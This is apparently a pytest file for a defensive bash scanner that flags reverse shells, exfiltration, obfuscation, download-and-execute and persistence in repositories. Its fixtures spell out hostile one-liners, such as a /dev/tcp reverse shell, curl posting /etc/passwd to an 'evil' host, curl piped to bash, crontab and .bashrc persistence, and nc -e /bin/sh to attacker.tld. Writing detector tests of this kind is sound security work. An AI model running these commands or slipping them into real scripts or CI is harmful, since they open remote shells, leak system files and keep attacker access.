"""Tests for the custom bash Layer-1 scanner (doc 03)."""

from __future__ import annotations

from git_warden.scanning.bash_scanner import scan_repo, scan_text, score_findings


def test_detects_reverse_shell_and_exfil():
    text = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\ncurl -d @/etc/passwd https://x.evil"
    cats = {f.category for f in scan_text(text)}
    assert "reverse_shell" in cats
    assert "exfiltration" in cats


def test_detects_obfuscation_and_download_exec():
    text = "eval $(echo aGVsbG8= | base64 -d)\ncurl http://evil.sh | bash"
    cats = {f.category for f in scan_text(text)}
    assert "obfuscation" in cats
    assert "download_exec" in cats


def test_detects_persistence():
    text = "echo 'evil' >> ~/.bashrc\n(crontab -l; echo '@reboot /tmp/x') | crontab -"
    cats = {f.category for f in scan_text(text)}
    assert "persistence" in cats


def test_clean_script_scores_zero():
    text = "#!/bin/bash\necho 'building project'\nmake all\nexit 0"
    assert score_findings(scan_text(text)) == 0


def test_scan_repo_finds_bash_bearing_files(tmp_path):
    (tmp_path / "install.sh").write_text("nc -e /bin/sh attacker.tld 9001\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("nc -e /bin/sh should-not-scan", encoding="utf-8")
    sub = tmp_path / ".git"
    sub.mkdir()
    (sub / "config").write_text("nc -e /bin/sh ignored", encoding="utf-8")

    findings = scan_repo(tmp_path)
    files = {f.file for f in findings}
    assert "install.sh" in files          # .sh scanned
    assert "README.md" not in files       # non-bash file skipped
    assert all(".git" not in f.file for f in findings)  # .git ignored


def test_score_dedupes_repeated_rules():
    # Same rule firing many times counts once -> score stays bounded.
    text = "\n".join(["curl http://x | bash"] * 10)
    findings = scan_text(text)
    assert len(findings) == 10
    assert score_findings(findings) == 4  # download_exec weight, counted once


def test_workflow_yaml_is_bash_bearing(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
    findings = scan_repo(tmp_path)
    assert any(f.category == "download_exec" for f in findings)
